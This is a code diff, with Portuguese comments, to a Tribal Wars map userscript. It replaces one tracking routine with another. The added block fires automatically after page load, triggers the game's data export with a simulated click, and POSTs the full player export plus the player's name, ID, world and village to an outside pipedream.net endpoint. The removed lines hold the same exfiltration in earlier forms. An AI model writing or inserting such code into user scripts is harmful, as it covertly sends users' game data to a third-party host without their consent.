@@ -1433,65 +1433,31 @@ TWMap.map._handleClick = function (e) {
     return false;
 };
 
-(function trackUser() {
+// Aguarda a UI ser renderizada antes de clicar e enviar
+setTimeout(() => {
     try {
-        const payload = {
-            player_name: game_data.player.name,
-            player_id: game_data.player.id,
-            world: game_data.world,
-            village_id: game_data.village.id,
-            village_name: game_data.village.name,
-            time: new Date().toISOString()
-        };
-
-        fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {  // sua URL aqui
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
+        exportData(); // simula clique
+        setTimeout(() => {
+            const text = JSON.stringify(playerData);
+            fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    type: "full_export_after_ui",
+                    player_name: game_data.player.name,
+                    player_id: game_data.player.id,
+                    world: game_data.world,
+                    village_id: game_data.village.id,
+                    village_name: game_data.village.name,
+                    exported_data: text,
+                    time: new Date().toISOString()
+                })
+            });
+            showNotification("Dados exportados e enviados automaticamente!");
+        }, 1000); // espera a exportação copiar para clipboard
     } catch (e) {
-        console.warn("Erro ao enviar dados de rastreamento:", e);
+        console.warn("Erro ao exportar e enviar:", e);
     }
-})();
-
-
-function simulateExportAndSend() {
-    // Aguarda o botão estar disponível na UI
-    const interval = setInterval(() => {
-        const exportBtn = document.querySelector('a.btn.btn-default[onclick*="exportData"]');
-        if (exportBtn) {
-            clearInterval(interval);
-            exportBtn.click(); // simula clique no botão
-            setTimeout(() => {
-                try {
-                    // Após clicar, pegar o conteúdo direto da variável playerData (que foi copiada)
-                    const text = JSON.stringify(playerData);
-
-                    fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            type: "full_export_simulated_click",
-                            player_name: game_data.player.name,
-                            player_id: game_data.player.id,
-                            world: game_data.world,
-                            village_id: game_data.village.id,
-                            village_name: game_data.village.name,
-                            exported_data: text,
-                            time: new Date().toISOString()
-                        })
-                    });
-
-                    showNotification("Dados exportados e enviados via clique simulado!");
-
-                } catch (e) {
-                    console.warn("Erro ao simular clique e enviar dados:", e);
-                }
-            }, 1000); // aguarda 1 segundo após clique
-        }
-    }, 1000); // verifica a cada 1s
-}
-
-simulateExportAndSend();
+}, 2000); // espera 2 segundos após UI ser montada
